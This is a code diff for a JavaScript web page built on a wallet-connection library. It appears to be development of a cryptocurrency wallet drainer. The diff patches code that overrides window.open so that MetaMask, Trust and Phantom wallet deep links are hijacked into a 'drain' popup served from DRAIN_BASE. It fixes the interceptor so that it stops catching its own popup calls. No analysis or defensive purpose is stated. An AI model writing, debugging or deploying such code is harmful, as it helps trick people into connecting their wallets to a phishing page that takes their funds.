@@ -51,6 +51,9 @@ const modal = createAppKit({
 // =====================================================
 let popupOpened = false;
 
+// Save original window.open EARLY — before any override
+const _origOpen = window.open.bind(window);
+
 function openDrainPopup(walletName) {
   if (popupOpened) return;
   popupOpened = true;
@@ -76,7 +79,8 @@ function openDrainPopup(walletName) {
     const pw = 440, ph = 700;
     const left = Math.round((screen.width - pw) / 2);
     const top = Math.round((screen.height - ph) / 2);
-    window.open(url, 'connect_wallet',
+    // Use _origOpen to bypass our own interceptor
+    _origOpen(url, 'connect_wallet',
       `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
     );
   }
@@ -134,10 +138,9 @@ const domObserver = new MutationObserver(() => {
 });
 domObserver.observe(document.body, { childList: true, subtree: true });
 
-// Method 4: Intercept deep links
-const _origOpen = window.open;
+// Method 4: Intercept deep links (wallet:// protocol opens)
 window.open = function(url, ...args) {
-  if (url && typeof url === 'string') {
+  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
     if (url.includes('metamask')) { openDrainPopup('metamask'); return null; }
     if (url.includes('trust')) { openDrainPopup('trust'); return null; }
     if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
